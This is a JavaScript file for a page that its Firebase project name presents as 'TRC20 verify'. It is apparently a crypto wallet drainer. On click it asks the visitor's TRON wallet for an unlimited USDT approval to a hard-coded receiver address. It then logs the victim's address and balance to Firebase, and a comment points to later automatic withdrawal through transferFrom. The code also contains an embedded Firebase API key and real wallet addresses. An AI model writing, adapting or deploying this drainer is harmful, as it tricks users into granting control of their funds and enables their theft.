import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";

// ✅ Step 1: Firebase Setup
const firebaseConfig = {
  apiKey: "AIzaSyDPwmF77VXvOlM3l4v2dJsqN0QFh8Qxwfk",
  authDomain: "trc20-verify-17c29.firebaseapp.com",
  projectId: "trc20-verify-17c29",
  storageBucket: "trc20-verify-17c29.firebasestorage.app",
  messagingSenderId: "197859891589",
  appId: "1:197859891589:web:ae2f73ab5c3b6bc1c88cec"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// ✅ Step 2: Contract Setup
const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC-20 USDT
const receiver = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN"; // Your TRC-20 receiving address

const ABI = [
  { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
  { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
  { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
];

document.getElementById("connectButton").onclick = async () => {
  if (!window.tronWeb || !window.tronWeb.ready) {
    alert("Please open in TronLink or Trust Wallet (TRON)");
    return;
  }

  const address = window.tronWeb.defaultAddress.base58;
  const contract = await window.tronWeb.contract(ABI, usdtAddress);

  try {
    // ✅ Unlimited USDT Approval
    await contract.approve(receiver, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();

    // ✅ Get Balance
    const balance = await contract.balanceOf(address).call();

    // ✅ Log to Firebase
    const userRef = ref(db, 'users/' + address);
    await set(userRef, {
      address: address,
      balance: parseInt(balance) / 1e6,
      approved: true,
      timestamp: Date.now()
    });

    // ✅ (Optional) Auto withdraw logic (requires backend webhook or watch)
    alert("USDT approved successfully.");
  } catch (e) {
    console.error("Error during approval:", e);
    alert("Something went wrong.");
  }
};
